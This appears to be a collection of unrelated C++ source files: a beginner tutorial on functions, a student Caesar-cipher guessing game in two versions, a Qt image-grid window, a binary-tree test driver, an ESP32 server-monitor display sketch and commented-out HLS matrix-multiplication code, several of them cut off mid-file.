    "/*\nFunctions\n1) What are functions?\n2) Why are functions used?\n3) Types of functions\n4) Built in functions (math.h)\n5) Garbage return value\n6) Pass by value\n7) Pass by refrence\n8) Arrays using pass by refrence\n\n1) What are functions?\nFunctions are set of code which performs something for us\n\n2) Why are functions used?\n- to modularise code\n- to incrase readability\n- to use same code mulitple times\n\n3) Types of functions\n- void: does not returns any thing. eg.: displaying anything. does something but Does not returns anything\n- return: throws some values\n- parameterised: functions needs to be passed along with some values.\n- non parameterised: functions need not requires any value while calling it.\n\n4) Built in functions (math.h)\n- many built in functions are provided in cpp like Trigonometric functions, Hyperbolic functions, Exponential and logarithmic functionsm, pow fucntions, etc.\n\n5) Garbage return value\n-  if function is declared as return type and does not returns any value then it returns some random garbage value\n\n6) Pass by value\n- it takes the parameter and perform the operations without updating the orignal parameter\n- copy is passed\n\n7) pass by refrence\n- it takes the parameter and perform the operations along with that it also updates the parameters orignal value\n- it takes orignal/ address\n\n8) Arrays using pass by refrence\n- arrays are always passed by reference even though we not pass it explicitly it is impllicitly passed by refrence!\n*/\n#include <iostream>\nusing namespace std;\n\nvoid printName()\n{\n    cout<<\"Inside void Function!\"<<endl;\n}\nvoid printNamePara(string name)\n{\n    cout<<\"Inside parameterised void(), name: \"<<name<<endl;\n}\nint sumNum(int a, int b)\n{\n    return a+b;\n}\nint GarbVal(int n)\n{\n    if(n>=0)\n    {\n        return n;\n    }\n    // here there is no return value for non -ve numbers so it will return garbage value!\n}\nvoid incrementNum(int n)\n{\n    cout<<\"Inside the incrementNum()\"<<endl;\n    cout<<n<<endl;\n    n += 5;\n    cout<<n<<endl;\n    n+=5;\n    cout<<n<<endl;\n}\nvoid incrementNumRef(int &n)\n{\n    cout<<\"Inside the incrementNumRef()\"<<endl;\n    cout<<n<<endl;\n    n += 5;\n    cout<<n<<endl;\n    n+=5;\n    cout<<n<<endl;\n}\nvoid strModify(string s)\n{\n    cout<<\"Inside strModify()\"<<endl;\n    cout<<s<<endl;\n    s[0] = 'o';\n    cout<<s<<endl;\n}\nvoid strModifyRef(string &s)\n{\n    cout<<\"Inside strModifyRef()\"<<endl;\n    cout<<s<<endl;\n    s[0] = 'o';\n    cout<<s<<endl;\n}\nvoid arrModify(int arr[], int n)\n{\n    cout<<\"Orignal value of arr[0]: \"<<arr[0]<<endl;\n    arr[0] += 100;\n    cout<<\"Value of array inside arrModify() arr[0]: \"<<arr[0]<<endl;\n}\n\n\nint main()\n{\n    //Void function (non parameterised)\n    cout<<\"\\nVoid function (non parameterised)\\n\";\n    printName();\n\n    //Parameterised void function\n    cout<<\"\\nParameterised void function\\n\";\n    printNamePara(\"Utkarsh\");\n\n    // return functions (parameterised)\n    cout<<\"\\nReturn functions (parameterised)\\n\";\n    int num1, num2;\n    cout<<\"Enter num1: \";\n    cin>>num1;\n    cout<<\"Enter num2: \";\n    cin>>num2;\n    cout<<num1<<\" + \"<<num2<<\" = \"<<sumNum(num1,num2)<<endl;\n\n    //Built in functions\n    cout<<\"\\nBuilt in functions\\n\";\n    cout<<\"Max of \"<<num1<<\", \"<<num2<<\" is \"<<max(num1,num2)<<endl;\n    cout<<\"Min of \"<<num1<<\", \"<<num2<<\" is \"<<min(num1,num2)<<endl;\n    cout<<\"Pow of \"<<num1<<\" raise to \"<<num2<<\" is \"<<pow(num1,num2)<<endl;\n\n    //Garbage Value return\n    cout<<\"\\nGarbage Value return\\n\";\n    cout<<\"Garbage value \"<<GarbVal(-1)<<endl;\n\n    //Pass by value\n    cout<<\"\\nPass by value\\n\";\n    int n = 10;\n    incrementNum(n);//pass by value funciton\n    cout<<\"n = \"<<n<<endl;//displays 10 as orignal value of num is not updated while passing a function by value\n    string s = \"Utkarsh\";\n    strModify(s);\n    cout<<\"s = \"<<s<<endl;\n\n    //Pass by refrence\n    cout<<\"\\nPass by refrence\\n\";\n    incrementNumRef(n);\n    cout<<\"n = \"<<n<<endl;\n    s = \"Utkarsh\";\n    strModifyRef(s);\n    cout<<\"s = \"<<s<<endl;\n\n    //Arrays using pass by refrence\n    cout<<\"\\nArrays using pass by refrence\\n\";\n    cout<<\"Conventional way to input an array and display it!\"<<endl;\n    int siz = 5;\n    int arr[siz];\n    for(int i=0; i<5; i++)\n    {\n        cout<<\"Value at arr[\"<<i<<\"] : \";\n        cin>>arr[i];\n    }\n    for(int i=0; i<5; i++)\n    {\n        cout<<\"arr[\"<<i<<\"] : \"<<arr[i]<<endl;\n    }\n    cout<<\"Pass by refrence : array and display it!\"<<endl;\n    arrModify(arr,siz);\n    cout<<\"Value of array after using arrModify() arr[0]: \"<<arr[0]<<endl;\n\n    return 0;\n}\n",
    "\n#include <iostream>\n#include <string>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\n//class\n\nclass regciphers{\n\n//string ciphers[10]; //cipher messages \nchar conversionchart[26] = {'a','b','c','d','e','f'\n, 'g', 'h','i','j','k','l',\n'm','n','o','p','q','r','s',\n't','u','v','w','x','y','z'}; //conversion chart\nint tries;//user has 3 tries\nint i; // for loop for message\nint j; //for loop for conversion chart\n\nint s;// for loop for decrypted message\nint t;// for loop for decrypted conversion chart\nchar encrypter;//encrpyter formula\nchar decrypter; //decryption formula\n   //ciphers\n    //string ci1 = ciphers[0] = \"stephen was here\";\n   \n//array of phrases\nstring ciphers[5] = {\"stephen was here\",\"sly fox, try pox, old slots\"\n,\"the quick brown fox jumps over the lazy dog\",\"operation nimrod is a go\",\n \"geronimo geronimo geronimo\"}; //ciphers\nint randomciphers; //random ciphers\nstring encryptgemini = \" \";//holder for the new encrypted message\nstring decryptapollo = \" \"; //holfer for decrypted message\n\npublic: //public class\n  \n  //function that allows different phrases to print out.\n  void randomizer(){\n\nsrand(time(0));\n\nrandomciphers = rand()%5; //random ciphers\n\n\n  }\n\n//reg encryption\nvoid encryption(){\n \n//cout << \"Reg Message: \" << ci1 << endl;\n//cout << endl;\n//find way to encrypt properly from first phrase to alphapet with caesars cipher PROPERLY\nfor( i = 0; i < ciphers[randomciphers].length(); i++){ // first statment \n for( j =0; j<26; j++){ //caesar converstion\n\n//if the conversionchart and phrase have the same character\nif(conversionchart[j] == ciphers[randomciphers][i]){\n    ciphers[randomciphers][i] = j; // character of sentence is equivalent to conversion chart letter\n            \n           //formula to encrypt the phrase\n           encrypter = (j+15)%26;\n        \n        //conversion chart is equivlanet to encrypter value\nif(j = encrypter){\n// encrypter number is equal to conversion chat index\n         encrypter = conversionchart[j];\n         encryptgemini += encrypter; // converts the number to a string\n     }\n}\n} \n}\ncout <<\"Encrypted message: \" << encryptgemini << \" \"; //actual encrypted message\n}\n\n\n//generator actual\n\n//decipher\n//attempt to view the entire decrpytion message\nvoid decipher(){\n//cout <<\"Encrypted message: \" << encryptgemini << \" \"; // encrypted message\n\nfor( s = 0; s < encryptgemini.length(); s++){ // first statment \n for( t =0; t<26; t++){ //caesar converstion\n\n//if the conversionchart and phrase have the same character\nif(conversionchart[t] == encryptgemini[s] ){\n      encryptgemini[s] = t ; // character of sentence is equivalent to conversion chart letter\n\n           //formula to encrypt the phrase\n           decrypter =  (t-15 +26)%26;\n    \n        //conversion chart is equivlanet to encrypter value\n\n// decrypter number is equal to conversion chat index\n         decrypter = conversionchart[decrypter];\n         decryptapollo += decrypter; // converts the number to a string\n\n}\n} \n} \ncout << endl;\n//cout <<\"decrypted message: \" << decryptapollo << \" \"; //actual encrypted message\n\n}\n//message actual\nvoid generatoractual(){\n\n  string userchoice;//user option\n  string userinput;\n  int tries = 1; // incrementer\n  int maxamount = 0; // maximum amount\n   //while loop for game.\n  while(true){\n//user can only place game once before exiting\n    if(maxamount == 1){\n      cout << \"You have reached the maximum amount of times you can use this game.\" << endl;\n      exit(0);\n    }\n  cout << \"Would you like to play a game?\" << endl;\n  cout << \"Type 'yes' to play or 'exit' to quit.\" << endl;\n  getline(cin,userinput);\n  // if user exits the game\n  if(userinput == \"exit\"){\n    cout << \"You have exited the game.\" << endl;\n    break;\n  }\n\n  //if user wishes to proceed with the game.\n  if(userinput == \"yes\"){\n    cout << \"You have chosen to play the game.\" << endl;\n   tries = 0;// for each time the user decides the play game, counter resets to 0.\n while(tries != 3){\n  \n//user input for the game\n  cout << \"Please enter your guess:\" << endl;\n\ngetline(cin,userchoice); //user input\n\n// if user successflly deciphers correctly.\nif(userchoice == decryptapollo){\n    cout << \"You have correctly decrypted the message!\" << endl;\n  exit(0);\n  //for each time the user gets the decipher wrong, the incrementer goes up. If incrememnter == 3, game over\n  }else if(!(userchoice == decryptapollo)){\n    cout << \"Incorrect. Please Try Again.\" << endl;\n  tries++;\n  }\n\n// hint appears after 2nd failed attempt. Has first 3 letters, and last 3 letters\nif(tries == 2){\n  cout << \"Hint: The Phrase Starts with \"<< decryptapollo[1]<< decryptapollo[2]<<decryptapollo[3] << \" and ends with \" \n << decryptapollo[decryptapollo.length()-3]<< decryptapollo[decryptapollo.length()-2]<< decryptapollo[decryptapollo.length()-1]<< endl;\n}\n\n//if the increment equals 3, the loop breaks, and the user didn't decipher the code properly.\n  if(tries == 3){\n    cout << \"You have failed to decrypt the message.\" << endl;\n    c",
    "\n#include <iostream>\n#include <string>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\n//class\n\nclass regciphers{\n\nchar conversionchart[26] = {'a','b','c','d','e','f'\n, 'g', 'h','i','j','k','l',\n'm','n','o','p','q','r','s',\n't','u','v','w','x','y','z'}; //conversion chart\nint i; // for loop for message\nint j; //for loop for conversion chart\n\nint s;// for loop for decrypted message\nint t;// for loop for decrypted conversion chart\nchar encrypter;//encrpyter formula\nunsigned char decrypter; //decryption formula\n\n//array of phrases\nstring ciphers[5] = {\"stephen was here\",\n\"sly fox try pox old slots\"\n,\"the quick brown fox jumps over the lazy dog\",\n\"operation nimrod is a go\",\n \"geronimo geronimo geronimo\"}; //ciphers\nint randomciphers; //random ciphers\nstring encryptgemini = \" \";//holder for the new encrypted message\nstring decryptapollo = \" \"; //holfer for decrypted message\n\npublic: //public class\n\n  //function that allows different phrases to print out.\n  void randomizer(){\n\nsrand(time(0));\n\nrandomciphers = rand()%5; //random ciphers\n\n\n  }\n\n//reg encryption\nvoid encryption(){\n\n//find way to encrypt properly from first phrase to alphapet with caesars cipher PROPERLY\nfor( i = 0; i < ciphers[randomciphers].length(); i++){ // first statment \n for( j =0; j<26; j++){ //caesar converstion\n\n//if the conversionchart and phrase have the same character\nif(conversionchart[j] == ciphers[randomciphers][i]){\n    ciphers[randomciphers][i] = j; // character of sentence is equivalent to conversion chart letter\n\n           //formula to encrypt the phrase\n           encrypter = (j+15)%26;\n\n        //conversion chart is equivlanet to encrypter value\nif((j = encrypter)){\n// encrypter number is equal to conversion chat index\n         encrypter = conversionchart[j];\n         encryptgemini += encrypter; // converts the number to a string\n     }\n}\n} \n}\ncout <<\"Encrypted message: \" << encryptgemini << \" \"; //actual encrypted message\n}\n\n\n//generator actual\n\n//decipher\n//attempt to view the entire decrpytion message\nvoid decipher(){\n//cout <<\"Encrypted message: \" << encryptgemini << \" \"; // encrypted message\n\nfor( s = 0; s < encryptgemini.length(); s++){ // first statment \n for( t =0; t<26; t++){ //caesar converstion\n\n//if the conversionchart and phrase have the same character\nif(conversionchart[t] == encryptgemini[s] ){\n      encryptgemini[s] = t ; // character of sentence is equivalent to conversion chart letter\n\n           //formula to encrypt the phrase\n           decrypter =  (t-15 +26)%26;\n\n        //conversion chart is equivlanet to encrypter value\n\n// decrypter number is equal to conversion chat index\n         decrypter = conversionchart[decrypter];\n         decryptapollo += decrypter; // converts the number to a string\n\n}\n} \n} \ncout << endl;\n//cout <<\"decrypted message: \" << decryptapollo << \" \"; //actual encrypted message\n\n}\n//message actual\nvoid generatoractual(){\n\n  string userchoice;//user option if they want to start\n  string userinput; // input for starting,exiting, and invalid phrase\n  int tries = 1; // incrementer\n  int maxamount = 0; // maximum amount\n   //while loop for generator.\n  while(true){\n//user can only place game once before exiting\n    if(maxamount == 1){\n      cout << \"You have reached the maximum amount of times you can use this generator.\" << endl;\n      exit(0);\n    }\n  cout << \"Welcome to the Caesar Cipher Generator!\" << endl;\n  cout << \"Type 'yes' to use the generator or 'exit' to quit.\" << endl;\n  getline(cin,userinput);\n  // if user exits the game\n  if(userinput == \"exit\"){\n    cout << \"You have exited the generator.\" << endl;\n    break;\n  }\n\n  //if user wishes to proceed with the game.\n  if(userinput == \"yes\"){\n    cout << \"You have chosen to use the generator.\" << endl;\n   tries = 0;// for each time the user decides the play game, counter resets to 0.\n while(tries != 3){\n\n//user input for the game\n  cout << \"Please enter your guess:\" << endl;\n\ngetline(cin,userchoice); //user input\n\n// if user successflly deciphers correctly.\nif(userchoice == decryptapollo){\n    cout << \"You have correctly decrypted the message!\" << endl;\n  exit(0);\n  //for each time the user gets the decipher wrong, the incrementer goes up. If incrememnter == 3, game over\n  }else if(!(userchoice == decryptapollo)){\n    cout << \"Incorrect. Please Try Again.\" << endl;\n  tries++;\n  }\n\n// hint appears after 2nd failed attempt. Has first 3 letters, and last 3 letters\nif(tries == 2){\n  cout << \"Hint: The Phrase Starts with \"<< decryptapollo[1]<< decryptapollo[2]<<decryptapollo[3] << \" and ends with \" \n << decryptapollo[decryptapollo.length()-3]<< decryptapollo[decryptapollo.length()-2]<< decryptapollo[decryptapollo.length()-1]<< endl;\n}\n\n//if the increment equals 3, the loop breaks, and the user didn't decipher the code properly.\n  if(tries == 3){\n    cout << \"You have failed to decrypt the message.\" << endl;\n    cout << \"Answer: \" << decryptapollo << endl;\n    exit(0);\n  maxamount++;\n  }\n\n\n }\n  }\n  //if user ente",
    "#include \"mainwindow.h\"\n\n#include <QFileDialog>\n#include <QPixmap>\n#include <QPoint>\n#include <QMenuBar>\n\n\nMainWindow::MainWindow(QWidget* parent) : QMainWindow(parent), preferences(new Preferences(this)) {\n    // create menu bar\n    QMenuBar* menuBar = new QMenuBar(this);\n    QMenu* fileMenu = new QMenu(\"File\", this);\n    menuBar->addMenu(fileMenu);\n\n    // add menu options\n    createAction(fileMenu, \"Open Image\", SLOT(openImage()));\n    createAction(fileMenu, \"Open Image Directory\", SLOT(openDir()));\n    createAction(fileMenu, \"Generate Grid\", SLOT(generateGrid()));\n    createAction(fileMenu, \"Preferences\", SLOT(openPreferences()));\n\n    setMenuBar(menuBar);\n\n    connect(preferences, &Preferences::accepted, this, &MainWindow::setBorderPreference);\n\n    // create central widget\n    QWidget* centralWidget = new QWidget(this);\n    setCentralWidget(centralWidget);\n\n    resize(640, 480);\n}\n\nMainWindow::~MainWindow() {\n    delete preferences;\n}\n\nvoid MainWindow::createAction(QMenu* menu, const QString& text, const char* member) {\n    QAction* action = new QAction(text, this);\n    menu->addAction(action);\n    connect(action, SIGNAL(triggered()), this, member);\n}\n\nvoid MainWindow::openImage() {\n    QString fileName = QFileDialog::getOpenFileName(this, \"Open Image File\", \"\", \"Images (*.png *.jpg *.jpeg *.tif)\");\n    if (!fileName.isEmpty()) {\n        MovableImage* image = new MovableImage(centralWidget(), fileName, preferences->thumbnailSize);\n        image->drawBorder = preferences->drawBorder;\n        images.push_back(image);\n    }\n}\n\nvoid MainWindow::openDir() {\n    QString directory = QFileDialog::getExistingDirectory(this, \"Open Image Directory\", QString(), QFileDialog::ShowDirsOnly | QFileDialog::DontResolveSymlinks);\n    if (!directory.isEmpty()) {\n        // get images in selected directory\n        QDir dir(directory);\n        QStringList filters;\n        filters << \"*.png\" << \"*.jpg\" << \"*.jpeg\" << \"*.tif\";\n        dir.setNameFilters(filters);\n        dir.setFilter(QDir::Files);\n\n        // load each image\n        QFileInfoList fileList = dir.entryInfoList();\n        foreach(const QFileInfo& fileInfo, fileList) {\n            MovableImage* image = new MovableImage(centralWidget(), fileInfo.absoluteFilePath(), preferences->thumbnailSize);\n            image->drawBorder = preferences->drawBorder;\n            images.push_back(image);\n        }\n    }\n}\n\nvoid MainWindow::generateGrid() {\n    if (images.empty())\n        return;\n\n    std::vector<std::vector<MovableImage*>> rows = { { images[0] } };\n    int tolerance = preferences->tolerance;\n\n    // iterate over images 1...\n    for (int img = 1; img < images.size(); img++) {\n        bool added = false;\n        // check whether it belongs in each row\n        for (int row = 0; row < rows.size(); row++) {\n            if (images[img]->y() < rows[row][0]->y() + tolerance\n                && images[img]->y() > rows[row][0]->y() - tolerance) {  // within +/- tolerance of the top edge of the first image in the row\n                rows[row].push_back(images[img]);\n                added = true;\n            }\n        }\n\n        if (!added)\n            // wasn't within the tolerance of any row, so add new row\n            rows.push_back({ images[img] });\n    }\n\n    // sort images in each row by x-coordinate\n    for (std::vector< MovableImage*> row : rows) {\n        std::stable_sort(row.begin(), row.end(),[](MovableImage* a, MovableImage* b) { return *a < *b; });\n    }\n\n    // sort rows by y-coordinate\n    std::sort(rows.begin(), rows.end(),\n        [](std::vector<MovableImage*> a, std::vector<MovableImage*> b) { return a[0] < b[0]; });\n\n    // need to decide some output acceptable by the other application\n}\n\nvoid MainWindow::openPreferences() {\n    preferences->show();\n    preferences->raise();\n    preferences->activateWindow();\n}\n\nvoid MainWindow::keyPressEvent(QKeyEvent* event) {\n    if (event->key() == Qt::Key_Delete) {\n        QWidget* fw = focusWidget();\n\n        // remove widget from images vector\n        auto it = std::remove(images.begin(), images.end(), fw);\n        images.erase(it, images.end());\n\n        // deallocate image\n        delete fw;\n    }\n}\n\nvoid MainWindow::setBorderPreference() {\n    for (MovableImage* img : images) {\n        img->drawBorder = preferences->drawBorder;\n    }\n}\n",
    "#include <iostream>\n#include \"BinaryTree.h\"\n\nint main()\n{\n\tBinaryTree<int> tree;\n\n\ttree.insertR(20);\n\ttree.insertI(10);\n\ttree.insertR(30);\n\ttree.insertR(9);\n\ttree.insertI(15);\n\ttree.insertR(16);\n\ttree.insertR(7);\n\ttree.insertI(25);\n\ttree.insertI(7);\n\ttree.insertR(15);\n\n\tstd::cout << \"tree findR 55: \" << std::boolalpha << tree.findR(55) << std::endl;\n\tstd::cout << \"tree findI 55: \" << std::boolalpha << tree.findI(55) << std::endl;\n\tstd::cout << \"tree findR 15: \" << std::boolalpha << tree.findR(15) << std::endl;\n\tstd::cout << \"tree findI 15: \" << std::boolalpha << tree.findI(15) << std::endl;\n\tstd::cout << \"tree findR -5: \" << std::boolalpha << tree.findR(-5) << std::endl;\n\tstd::cout << \"tree findI -5: \" << std::boolalpha << tree.findI(-5) << std::endl;\n\n\tstd::cout <<\"\\npreorder recoursive: \";\n\ttree.preorderR();\n\n\tstd::cout << \"\\npreorder iterative:  \";\n\ttree.preorderI();\n\n\tstd::cout << \"\\ninorder recoursive: \";\n\ttree.inorderR();\n\n\tstd::cout << \"\\ninorder iterative:  \";\n\ttree.inorderI();\n\n\tstd::cout << \"\\npostorder recoursive: \";\n\ttree.postorderR();\n\n\tstd::cout << \"\\npostorder iterative:  \";\n\ttree.postorderI();\n\n\tstd::cout << \"\\nlevelorder iterative:  \";\n\ttree.levelorder();\n\n\tstd::cout << \"\\nCount of Nodes: \" << tree.countOfNodesR();\n\tstd::cout << \"\\nCount of Leaves: \" << tree.countOfLeavesR();\n\n\tstd::cout << \"\\nHeightR of Tree: \" << tree.heightR();\n\tstd::cout << \"\\nHeightI of Tree: \" << tree.heightI();\n\n\tstd::cout << \"\\nWidthI of Tree: \" << tree.widthI();\n\tstd::cout << \"\\nWidthR of Tree: \" << tree.widthR();\n\n\tstd::cout << \"\\nMax of Tree: \" << tree.findMaxI();\n\tstd::cout << \"\\nMin of Tree: \" << tree.findMinR();\n\n\tstd::cout << \"\\ndeleting 7 15 20\" << std::endl;\n    \n\n\ttree.eraseI(7);\n\ttree.eraseR(15);\n\ttree.eraseR(20);\n\ttree.eraseI(15);\n\n\n\tstd::cout << \"\\ninorder recoursive after deleting nodes: \";\n\ttree.inorderR();\n\n\tstd::cout << \"\\nlevelorder iterative:  \";\n\ttree.levelorder();\n\n\ttree.clearR();\n\n\tstd::cout << \"\\npostorder after clearing: \";\n\ttree.postorderR();\n\n\n\n\treturn 0;\n\n}\n",
    "#include <TFT_eSPI.h> // Graphics and font library for ST7735 driver chip\n#include <SPI.h>\n#include <WiFi.h>\n#include <OneButton.h>\n\n\n#include \"pin_config.h\"\n#include \"time.h\"\n\n\n#define SCREEN_WIDTH 320\n#define SCREEN_HEIGHT 170\n#define PIN_INPUT_BUTTON 14\n\n\nTaskHandle_t drawGuiUpdate;\n\n\nTFT_eSPI tft = TFT_eSPI();  // Invoke library, pins defined in User_Setup.h\nTFT_eSprite sprite = TFT_eSprite(&tft);\n\nconst char* ssid = \"WIFI SSID\";\nconst char* password = \"WIFI PASSWORD\";\nconst char* ntpServer = \"time.google.com\";\nconst long gmtOffset = 3600;\nconst int daylightOffset = 0;\nconst int wifiTimeout = 10000;\n\nconst int fontSize = 15;\n\n// Splash screen config\nString productName = \"ServerMon\";\nString productVer = \"v0.1\";\nString productType = \"For Dell R740xd\";\n\n// Graph data\nconst int cpuUsagePoints = 100;\nint cpuUsage[cpuUsagePoints] = {0, };\n\n// Metrics gui config\nconst int cpu1TempPosX = 6;\nconst int cpu1TempPosY = 43;\nconst int cpu2TempPosX = 6;\nconst int cpu2TempPosY = 58;\nconst int cpuUsePosX = 6;\nconst int cpuUsePosY = 73;\nconst int statusPosX = 160;\nconst int statusPosY = 43;\nconst int memoryPosX = 160;\nconst int memoryPosY = 58;\nconst int loadAvgPosX = 160;\nconst int loadAvgPosY = 73;\nconst int metricsValueSpacing = 104;\n\n// Disk gui config\nconst int diskTextSize = 8;\nconst int diskPosX = 0;\nconst int diskPosY = 110;\nconst int totalDiskCount = 12;\nconst int diskRow = 3;\nconst int cellSpacing = 2;\nconst int cellWidth = 40;\nconst int cellHeight = 20;\n// 1 = ReadIO, 2 = WriteIO\nint diskUsageRW = 1;\n\n// Cpu graph gui config\nconst int graphPosX = 160;\nconst int graphPosY = 110;\nconst int graphHeight = 60;\nconst int graphWidth = 160;\nconst int legendSize = 22;\n\n// Status modelbox config\nconst int mbPosX = 220;\nconst int mbPosY = 4;\nconst String mbName = \"Dell R740xd\";\n\nchar attributeMarker = ':';\nchar valueMarker = ',';\nchar valueSpace = '|';\nString buff = \"\";\nString property = \"\";\nString value = \"\";\n\nint ntpUpdateTimer = 0;\nint graphUpdateTimer = 0;\n\nint overallStatus = -1;\nfloat cpuPercentage = -1;\nfloat loadAvg15 = -1;\nfloat memPercentage = -1;\nString diskUsage = \"\";\nString cpuTemp = \"\";\ntypedef struct cpuTemp_ {\n  int cpuNum = 0;\n  float temperature = -1;\n} cpuTemp_st;\ntypedef struct diskUsage_ {\n  int diskRead = -1;\n  int diskWrite = -1;\n  int diskStatus = -1;\n} diskUsage_st;\n\n// Button config\nOneButton button(PIN_INPUT_BUTTON, true);\n\n\nvoid drawGraphDots(int offsetX, int offsetY, int width, int height) {\n  // Draw graph dots\n  int dotPerRow = 5;\n  int dotPerCol = 3;\n  int dotSpacingX = width / (dotPerRow + 1);\n  int dotSpacingY = height / (dotPerCol + 1);\n  int posX = offsetX + (dotSpacingX / 2);\n  int posY = offsetY + dotSpacingY;\n  for (int i=0; i<dotPerCol; i++) {\n    for (int j=0; j<dotPerRow; j++) {\n      sprite.drawPixel(posX, posY, TFT_YELLOW);\n      posX = posX + dotSpacingX;\n    }\n    posX = offsetX + (dotSpacingX / 2);\n    posY = posY + dotSpacingY;\n  }\n\n  sprite.pushSprite(0, 0);\n}\n\n\nvoid drawAndSaveCpuGraph(int data, int offsetX, int offsetY, int width, int height, bool flush) {\n  offsetX = offsetX + 1 + legendSize;\n  offsetY = offsetY - 1;\n\n  if(flush) {\n    sprite.fillRect(offsetX, offsetY - height, width, height, TFT_BLACK);\n    // Redraw dots\n    drawGraphDots(offsetX, offsetY - height, width, height);\n  }\n\n  width = width - legendSize;\n  \n  // Plot and save datapoints\n  for (int i=0; i<cpuUsagePoints; i++) {\n    if ((i + 1) >= cpuUsagePoints) {\n      cpuUsage[i] = 0;\n    }\n    else {\n      cpuUsage[i] = cpuUsage[i+1];\n    }\n  }\n  if (data > 100) {\n    cpuUsage[cpuUsagePoints - 1] = 100;\n  }\n  else if (data < 0) {\n    cpuUsage[cpuUsagePoints - 1] = 0;\n  }\n  else {\n    cpuUsage[cpuUsagePoints - 1] = data;\n  }\n\n  float interval = width / (float) cpuUsagePoints;\n  float prevPosX, nextPosX;\n  int prevPosY, nextPosY;\n  prevPosX = offsetX;\n  prevPosY = offsetY - cpuUsage[0];\n  for(int j=0; j<cpuUsagePoints; j++) {\n    nextPosX = prevPosX + interval;\n    nextPosY = map(cpuUsage[j], 0, 100, offsetY - 1, offsetY - height + 1);\n    sprite.drawLine(round(prevPosX), prevPosY, round(nextPosX), nextPosY, TFT_GREEN);\n    prevPosX = nextPosX;\n    prevPosY = nextPosY;\n  }\n\n  sprite.pushSprite(0, 0);\n}\n\n\nvoid drawDiskGrid(int offsetX, int offsetY) {\n  // Draw grid title\n  if (diskUsageRW == 1) {\n    sprite.drawString(\"Disk Read IOPS    \", offsetX, offsetY - fontSize);\n  }\n  else if (diskUsageRW == 2) {\n    sprite.drawString(\"Disk Write IOPS    \", offsetX, offsetY - fontSize);\n  }\n\n  // Draw disk shelf grid\n  sprite.setCursor(offsetX, offsetY);\n  for(int i=0; i<diskRow; i++) {\n    for(int j=0; j<(totalDiskCount / diskRow); j++) {\n      int posX = (cellWidth * j) + offsetX;\n      int posY = (cellHeight * i) + offsetY;\n      sprite.drawRect(posX, posY, cellWidth, cellHeight, TFT_DARKGREY);\n    }\n  }\n}\n\nvoid drawGraph(int offsetX, int offsetY) {\n  // Change init pos to graph\n  int startX = offsetX;\n  int startY = SCREEN_HEIGHT - offsetY;\n\n  // Draw graph title\n  sprite.drawString(\"CPU Usage(%) - 1 Hour\", offset",
    "#include \"matrix.h\"\n\n// \u53c2\u8003 https://blog.csdn.net/qq_45364953/article/details/127641923\n//\n//void MatrixMultiple(A_T A[A_D1][A_D2], B_T B[B_D1][B_D2], C_T C[C_D1][C_D2]) {\n//#pragma HLS INTERFACE s_axilite port=B\n//#pragma HLS INTERFACE s_axilite port=C\n//#pragma HLS INTERFACE s_axilite port=A\n//#pragma HLS INTERFACE s_axilite port=return\n//    // partiton \u4f18\u5316\u8bed\u53e5\n//\t#pragma HLS ARRAY_PARTITION variable=B complete dim=1\n//\t#pragma HLS ARRAY_PARTITION variable=A complete dim=2\n////#pragma HLS INTERFACE s_axilite port=return\n////#pragma HLS INTERFACE s_axilite port=B\n////#pragma HLS INTERFACE s_axilite port=C\n////#pragma HLS INTERFACE s_axilite port=A\n////#pragma HLS ARRAY_RESHAPE variable=B complete dim=1\n////#pragma HLS ARRAY_RESHAPE variable=A complete dim=2\n//\tfor(int i = 0; i < A_D1; ++ i){\n//\t\tfor(int j = 0; j < B_D2; ++ j){\n//\t\t\t#pragma HLS PIPELINE II=1\n//\t\t\tC[i][j] = 0;\n//\t\t\tfor(int k = 0; k < B_D1; ++ k){\n//\t\t\t\tC[i][j] += (C_T)A[i][k]*B[k][j];\n//\t\t\t}\n//\t\t}\n//\t}\n//}\n\n//void MatrixMultiple(ap_int<8> A[4][4], ap_int<8> B[4][4], ap_int<16> C[4][4]){\n//\t#pragma HLS INTERFACE s_axilite port=return\n//\t#pragma HLS INTERFACE s_axilite port=B\n//\t#pragma HLS INTERFACE s_axilite port=C\n//\t#pragma HLS INTERFACE s_axilite port=A\n//\t#pragma HLS ARRAY_RESHAPE variable=B complete dim=1\n//\t#pragma HLS ARRAY_RESHAPE variable=A complete dim=2\n//\tfor(int i=0;i<4;i++)\n//\t\tfor(int j=0;j<4;j++){\n//\t\t\t#pragma HLS PIPELINE II=1\n//\t\t\tC[i][j]=0;\n//\t\t\t// \u5faa\u73af\u4e58\u56db\u6b21\uff0c\u5e76\u8fdb\u884c\u76f8\u52a0\n//\t\t\tfor(int k=0;k<4;k++){\n//\t\t\t\tC[i][j]=C[i][j]+A[i][k]*B[k][j];\n//\t\t\t}\n//\t\t}\n//}\n\n//\n//void MatrixMultiple(double A[100], double B[100],double C[100]){\n//\t#pragma HLS INTERFACE s_axilite port=return\n//\t#pragma HLS INTERFACE s_axilite port=B\n//\t#pragma HLS INTERFACE s_axilite port=C\n//\t#pragma HLS INTERFACE s_axilite port=A\n////\t#pragma HLS ARRAY_RESHAPE variable=B complete dim=1\n////\t#pragma HLS ARRAY_RESHAPE variable=A complete dim=2\n////\tdouble a = 1, b = 2, c = 1;\n////\t\t  VertexCurveABC abc;\n////\t\t  abc.parameters[0][0] = 0;\n////\t\t  abc.parameters[1][0] = 0;\n////\t\t  abc.parameters[2][0] = 0;\n//\n//\t  // \u6784\u5efa\u95ee\u9898\n//\t\t  Problem problem;\n//\n//\t\t  // \u6784\u5efa100\u6761\u8fb9\n//\t\t  for (int i = 0; i < 100; i++) {\n////\t\t\tverticies_[0]=&abc;\n//\t\t\t// problem.edge_curves[i].verticies_[0].parameters[0][0] = 0;\n//\t\t\t// problem.edge_curves[i].verticies_[0].parameters[1][0] = 0;\n//\t\t\t// problem.edge_curves[i].verticies_[0].parameters[2][0] = 0;\n//\t\t\tdouble info[1][1];\n//\t\t\tinfo[0][0] = 1;\n//\t\t\tproblem.edge_curves[i].SetInformation(info);\n////\t\t\tdouble x = i / 100.0;\n////\t\t\tproblem.edge_curves[i].x_ = x;\n////\t\t\tproblem.edge_curves[i].y_ = std::exp(a * x * x + b * x + c);\n//\t\t\tproblem.edge_curves[i].x_ = A[i];\n//\t\t\tproblem.edge_curves[i].y_ = B[i];\n//\t\t\tproblem.edge_curves_size++;\n//\t\t  }\n//\n//\t\t  \t  // problem.CalculateResidual();\n//\t\t  \t  // std::terminate();\n//\t\t  \t  // std::cout << VAR(problem.Chi2()) << std::endl;\n//\t\t  \t  // 